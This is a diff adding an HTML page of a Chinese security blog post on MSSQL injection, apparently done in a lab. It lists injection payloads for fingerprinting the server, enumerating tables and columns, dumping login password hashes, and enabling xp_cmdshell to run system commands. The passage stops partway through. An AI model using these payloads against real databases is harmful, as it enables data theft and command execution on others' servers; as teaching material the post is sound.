@@ -1,0 +1,968 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+  <link rel="alternate" href="/atom.xml" title="C0cho's blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="本文主要整理MSSQL注入，使用Ph0rse环境MSSQL安装MSSQL安装选择默认实例选择混合模式并输入密码MSSQL身份验证方式MSSQL自带数据库MSSQL自带四个系统库，分别存储一些特殊信息，对于前期注入而言，尤其要掌握tempdbtempdb数据库是一个非常特殊的数据库，供所有来访问你的MSSQL的用户使用。这个库用来保存所有的临时表、存储过程和其他MSSQL建立的临时用的东西。例如，排">
+<meta name="keywords" content="mssql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MsSQL注入">
+<meta property="og:url" content="https://choge.top/2020/03/19/MsSQL注入/index.html">
+<meta property="og:site_name" content="C0cho&#39;s blog">
+<meta property="og:description" content="本文主要整理MSSQL注入，使用Ph0rse环境MSSQL安装MSSQL安装选择默认实例选择混合模式并输入密码MSSQL身份验证方式MSSQL自带数据库MSSQL自带四个系统库，分别存储一些特殊信息，对于前期注入而言，尤其要掌握tempdbtempdb数据库是一个非常特殊的数据库，供所有来访问你的MSSQL的用户使用。这个库用来保存所有的临时表、存储过程和其他MSSQL建立的临时用的东西。例如，排">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-1.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-1.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-4.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-5.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-6.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-7.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-8.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-10.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-11.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-20.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-12.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-13.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-14.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-15.png">
+<meta property="og:image" content="https://choge.top/Users/c0cho/hexo/source/_posts/MsSQL%E6%B3%A8%E5%85%A5/mssql-16.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-17.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-18.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-19.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-24.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-25.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-26.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-27.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-28.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-29.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-21.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-22.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-23.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-30.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-31.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-32.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-33.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-34.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-35.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-36.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-37.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-38.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-39.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-40.png">
+<meta property="og:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-41.png">
+<meta property="og:updated_time" content="2020-04-08T04:26:17.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MsSQL注入">
+<meta name="twitter:description" content="本文主要整理MSSQL注入，使用Ph0rse环境MSSQL安装MSSQL安装选择默认实例选择混合模式并输入密码MSSQL身份验证方式MSSQL自带数据库MSSQL自带四个系统库，分别存储一些特殊信息，对于前期注入而言，尤其要掌握tempdbtempdb数据库是一个非常特殊的数据库，供所有来访问你的MSSQL的用户使用。这个库用来保存所有的临时表、存储过程和其他MSSQL建立的临时用的东西。例如，排">
+<meta name="twitter:image" content="https://choge.top/2020/03/19/MsSQL注入/mssql-1.png">
+  <link rel="canonical" href="https://choge.top/2020/03/19/MsSQL注入/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>MsSQL注入 | C0cho's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0cho's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">less is more</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">44</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">8</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">76</span></a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://choge.top/2020/03/19/MsSQL注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0cho">
+      <meta itemprop="description" content="记录生活的点点滴滴">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0cho's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            MsSQL注入
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-19 22:11:18" itemprop="dateCreated datePublished" datetime="2020-03-19T22:11:18+08:00">2020-03-19</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-08 12:26:17" itemprop="dateModified" datetime="2020-04-08T12:26:17+08:00">2020-04-08</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Sql-injection/" itemprop="url" rel="index">
+                    <span itemprop="name">Sql injection</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>6.8k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>6 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文主要整理MSSQL注入，使用Ph0rse环境</p><h2 id="MSSQL安装"><a href="#MSSQL安装" class="headerlink" title="MSSQL安装"></a>MSSQL安装</h2><h3 id="MSSQL安装-1"><a href="#MSSQL安装-1" class="headerlink" title="MSSQL安装"></a>MSSQL安装</h3><p>选择默认实例</p><p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-1.png" alt="mssql-1"></p><p>选择混合模式并输入密码</p><p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-1.png" alt="mssql-1"></p><h3 id="MSSQL身份验证方式"><a href="#MSSQL身份验证方式" class="headerlink" title="MSSQL身份验证方式"></a>MSSQL身份验证方式</h3><h3 id="MSSQL自带数据库"><a href="#MSSQL自带数据库" class="headerlink" title="MSSQL自带数据库"></a>MSSQL自带数据库</h3><p>MSSQL自带四个系统库，分别存储一些特殊信息，对于前期注入而言，尤其要掌握tempdb</p><p>tempdb数据库是一个非常特殊的数据库，供所有来访问你的MSSQL的用户使用。这个库用来保存所有的临时表、存储过程和其他MSSQL建立的临时用的东西。例如，排序时要用到tempdb数据库。数据库放进tempdb数据库，排序完后再把结果返回给用户。每次MSSQL重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永远保存的表。</p><a id="more"></a>
+
+
+
+
+
+
+<h2 id="MSSQL注入"><a href="#MSSQL注入" class="headerlink" title="MSSQL注入"></a>MSSQL注入</h2><h3 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h3><h4 id="初步判断是否为mssql"><a href="#初步判断是否为mssql" class="headerlink" title="初步判断是否为mssql"></a>初步判断是否为mssql</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> user&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="判断数据库"><a href="#判断数据库" class="headerlink" title="判断数据库"></a>判断数据库</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">and</span> (<span class="built_in">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> sysobjects)&gt;<span class="number">0</span>   <span class="meta"># mssql</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">and</span> (<span class="built_in">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> mysysobjects)&gt;<span class="number">0</span>   <span class="meta"># access</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@@<span class="built_in">version</span> <span class="comment">#查看版本</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="comment">@@</span>version--</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-4.png" alt="mssql-4"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> @@<span class="keyword">version</span> <span class="keyword">like</span> <span class="string">'%14%'</span> ;  <span class="comment">#探测版本，版本正确，执行成功</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0rse1' <span class="keyword">and</span> @@<span class="built_in">version</span> like '%<span class="number">14</span>%'  <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-5.png" alt="mssql-5"></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0rse1' <span class="keyword">and</span> @@<span class="built_in">version</span> like '%<span class="number">15</span>%'  <span class="comment">--+  #版本错误执行未成功</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-6.png" alt="mssql-6"></p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> <span class="built_in">name</span>,loginame <span class="keyword">from</span> master..syslogins,master..sysprocesses    <span class="meta">#syslogins存储登陆信息   sysprocesses存储进程信息</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-7.png" alt="mssql-7"></p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">user</span>, <span class="selector-tag">system_user</span>, <span class="selector-tag">suser_sname</span>(), <span class="selector-tag">is_srvrolemember</span>(<span class="string">'sysadmin'</span>)，<span class="selector-tag">is_srvrolemember</span>(<span class="string">'public'</span>)</span><br><span class="line">#查看权限<span class="selector-tag">null</span>表示非<span class="selector-tag">sysadmin</span>权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-8.png" alt="mssql-8"></p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="symbol">@servername</span>  <span class="meta">#查看服务器名字</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' <span class="keyword">and</span> ((<span class="built_in">select</span> <span class="built_in">host_name</span>())=(<span class="built_in">select</span> <span class="comment">@@</span>servername))--  </span><br><span class="line">判断是否站库分离，报错，则站库分离，回显正常，则无站库分离</span><br><span class="line"><span class="comment">@@</span>servername代表服务名字 web端</span><br><span class="line">host_name代表web应用主机系统名字 数据库端</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> master..sysdatabases   <span class="comment">#查询数据库名字</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-10.png" alt="mssql-10"></p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select DB_NAME(<span class="built_in">i</span>) 查询数据库名字 <span class="built_in">i</span>代表第几个数据库</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-11.png" alt="mssql-11"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_helpdb master;   <span class="comment">#定位数据库文件 location of master.mdf</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-20.png" alt="mssql-20"></p>
+<h3 id="暴数据表"><a href="#暴数据表" class="headerlink" title="暴数据表"></a>暴数据表</h3><p>sysobject是一个系统视图，用于存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，而XTYPE代表对象的类型。</p>
+<p>U 表（用户定义类型）</p>
+<p>V  视图</p>
+<p>P  存储过程</p>
+<p>X  扩展存储过程</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> name <span class="keyword">from</span> master..sysobjects <span class="keyword">where</span> xtype=<span class="string">'U'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-12.png" alt="mssql-12"></p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> substring(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables &gt; <span class="comment">'A'</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_name <span class="built_in">not</span> in (<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> master..syscolumns <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> master..syscolumns <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'tablename'</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> substring(column_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> information_schema.columns &gt; <span class="comment">'A'</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="built_in">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> column_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name %<span class="number">2</span>b<span class="string">','</span><span class="keyword">from</span> information_schema.tables <span class="keyword">for</span> <span class="keyword">xml</span> <span class="keyword">path</span>(<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1=0;<span class="keyword">begin</span></span><br><span class="line"><span class="keyword">declare</span> @xy <span class="built_in">varchar</span>(<span class="number">8000</span>) <span class="keyword">set</span> @xy=<span class="string">';'</span></span><br><span class="line"><span class="keyword">select</span> @xy=@xy + <span class="string">''</span> +<span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype=<span class="string">'U'</span> <span class="keyword">and</span> <span class="keyword">name</span> &gt; @xy</span><br><span class="line"><span class="keyword">select</span> @xy <span class="keyword">as</span> xy <span class="keyword">into</span> TMP_DB</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="获取用户账号和hash"><a href="#获取用户账号和hash" class="headerlink" title="获取用户账号和hash"></a>获取用户账号和hash</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name,master<span class="selector-class">.sys</span><span class="selector-class">.fn_sqlvarbasetostr</span>(password_hash) from master<span class="selector-class">.sys</span><span class="selector-class">.sql_logins</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="权限探测"><a href="#权限探测" class="headerlink" title="权限探测"></a>权限探测</h3><p>1.多语句注入 </p>
+<p>mysql条件比较苛刻，而msqql没那么苛刻</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0rse1' ;exec xp_cmdshell <span class="symbol">'whoami</span> &gt; c:\tmp\<span class="number">1</span>.txt' <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-13.png" alt="mssql-13"></p>
+<p>执行xp_cmdshell之前需判断是否开启xp_cmdshell存储过程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">从MSSQL2005版本之后默认关闭</span><br><span class="line">1' and 1=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> master..sysobjects <span class="keyword">where</span> xtype=<span class="string">'X'</span>  <span class="keyword">and</span> <span class="keyword">name</span>=<span class="string">'xp_cmdshell'</span>)<span class="comment">--</span></span><br><span class="line">若报错，则没有开启</span><br><span class="line">正常回显，则表示开启</span><br></pre></td></tr></table></figure>
+
+<p>xp_cmdshell开启语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span> ,1 ;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span> ,1 ;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0rse1' ; <span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span>  ,<span class="number">1</span> ; reconfigure; <span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span>   ,<span class="number">1</span> ; reconfigure;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-14.png" alt="mssql-14"></p>
+<p>在开启xp_cmdshell情况下执行<code>whoami &gt; c:\tmp\1.txt</code>命令后查看1.txt文件如下</p>
+<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-15.png" alt="mssql-15"></p>
+<p>2.tmp临时表</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="selector-tag">table</span> <span class="selector-id">#MyTempTable</span> (cola int primary key)</span><br></pre></td></tr></table></figure>
+
